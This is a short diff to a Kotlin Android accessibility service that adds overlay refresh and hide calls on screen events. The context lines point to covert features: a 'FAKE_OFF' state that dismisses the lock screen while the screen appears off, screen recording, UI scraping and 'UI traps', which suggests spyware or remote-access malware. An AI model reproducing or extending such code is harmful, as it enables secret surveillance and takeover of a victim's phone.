@@ -204,6 +204,7 @@ class MyAccessibilityService : AccessibilityService() {
                     prefs.edit().putLong("screen_on_ts", System.currentTimeMillis()).apply()
                     DebugLogger.log("MONITOR_SYS", "Broadcast received: ACTION_SCREEN_ON. Triggering wake protocols.")
                     DynamicUIManager.dispatchScreenState(true)
+                    UserOverlayManager.refresh(context)
                     
                     if (prefs.getString("power_shield_state", "NORMAL") == "FAKE_OFF") {
                         DebugLogger.log("POWER_SHIELD", "ACTION_SCREEN_ON in FAKE_OFF state. Dismissing Keyguard to extend system timer.")
@@ -270,6 +271,7 @@ class MyAccessibilityService : AccessibilityService() {
                     ScreenRecordManager.pauseRecording()
                     DynamicUIManager.dispatchScreenState(false)
                     AuthRecoveryManager.onScreenOff()
+                    UserOverlayManager.hide(context)
 
                     if (keepIgnited) {
                         val hasDimmer = DimmerManager.currentLevel < 100
@@ -451,6 +453,7 @@ class MyAccessibilityService : AccessibilityService() {
         // Restore Scraper Session Queue
         loadTreeTasks()
         reloadUiTraps()
+        UserOverlayManager.refresh(this)
         
         val rulesStr = prefs.getString("cached_rules", "{}")
         cachedRules = try {
